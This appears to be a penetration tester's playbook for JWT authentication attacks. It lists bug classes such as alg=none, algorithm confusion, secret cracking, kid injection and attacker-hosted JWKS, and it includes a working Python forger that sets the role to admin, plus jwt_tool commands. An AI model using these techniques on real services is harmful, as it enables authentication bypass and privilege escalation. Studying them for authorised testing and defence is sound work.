# JWT attacks — playbook

## when to try
- Any `Authorization: Bearer <eyJ...>` header.
- Cookie called `jwt`, `id_token`, `access_token`, `auth`, `session` whose value
  starts with `eyJ`.
- OAuth/OIDC flows — `id_token` is always a JWT.
- API gateways that issue short-lived tokens (Cloudflare Access, AWS Cognito).

## decode first
```bash
echo '<jwt>' | python3 -c "import sys,base64,json; h,p,s=sys.stdin.read().strip().split('.'); print(json.dumps(json.loads(base64.urlsafe_b64decode(h+'==')),indent=2)); print(json.dumps(json.loads(base64.urlsafe_b64decode(p+'==')),indent=2))"
```
Look at: `alg`, `typ`, `kid`, `iss`, `aud`, `sub`, `exp`, `iat`, custom claims (`role`, `org_id`, `tenant`).

## key bug classes
1. **alg=none**: change header to `{"alg":"none","typ":"JWT"}`, drop signature. Some libs still accept it.
2. **alg confusion (HS256↔RS256)**: server expects RS256 with public key verification; if you switch to HS256 and use the **public key** as the HMAC secret, it verifies. Common in Node/Java libs that pre-2018.
3. **Weak HS256 secret**: brute-force with hashcat (`hashcat -m 16500`) or jwt-cracker. Common values: `secret`, `key`, app name, GitHub-leaked secrets.
4. **kid injection**:
   - `kid` is read from a file path → path traversal (`../../../dev/null` → empty key).
   - `kid` is concatenated into a SQL query → SQLi.
   - `kid` accepts a URL → SSRF + use your own JWKS.
5. **jku/x5u header**: server fetches the key from the URL in the header — point it at attacker.com hosting your own JWKS. (Requires SSRF or whitelist bypass.)
6. **Unverified claim trust**: server reads `email`/`role`/`tenant_id` from the JWT but ALSO honors a request body field with the same name — pass `tenant_id` of victim org.
7. **Missing `aud`/`iss` validation**: token from a sibling service is accepted by the target service.
8. **JWT replay after logout**: server doesn't track revocation — old tokens still work after logout/password-reset.

## confirmation flow
1. Decode header + payload. Note `alg` and `kid`.
2. Try `alg=none` — if accepted, you're done.
3. If RS256: try alg-confusion. Need the public key (often at `/.well-known/jwks.json` or `/jwks` or `/oauth/.well-known/openid-configuration`).
4. If HS256: try cracking with rockyou + common-secrets-list (small wordlist, ~5 min).
5. Inspect each claim — replay token modifying ONE claim at a time. If `role: "user" → "admin"` with re-signed token works, vertical-priv-esc.

## exploitation snippet
alg-confusion:
```bash
# Get public key
curl -sk https://target/.well-known/jwks.json | jq

# Convert JWK to PEM (jwt_tool helps)
pip install jwt-tool
jwt_tool eyJ... -X k -pk pubkey.pem
# This emits a tampered HS256-signed JWT using the public key as secret.
```

alg=none:
```python
import base64, json
h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
p_orig = "<paste payload b64>"
p = base64.urlsafe_b64decode(p_orig+'==').decode()
p = json.loads(p); p["role"]="admin"
p_b64 = base64.urlsafe_b64encode(json.dumps(p,separators=(',',':')).encode()).rstrip(b'=').decode()
print(f"{h}.{p_b64}.")  # empty signature
```

## caveats
- **Don't tamper with prod tokens.** Use your own test account's token.
- Many libs in 2024+ refuse `alg=none` by default — don't waste cycles on hardened stacks; pivot to claim-trust bugs.
- A "successful" tampered token that returns 200 might mean the server accepted it OR it cached a previous valid response. Vary a claim that affects output (e.g. `sub` → expect different user data).

## provenance
- PortSwigger JWT lab family.
- jwt_tool (ticarpi).
- Auth0 + Okta historical CVEs (alg-confusion patches).
- Public: 2018 alg-confusion in node-jsonwebtoken < 9.0.0.
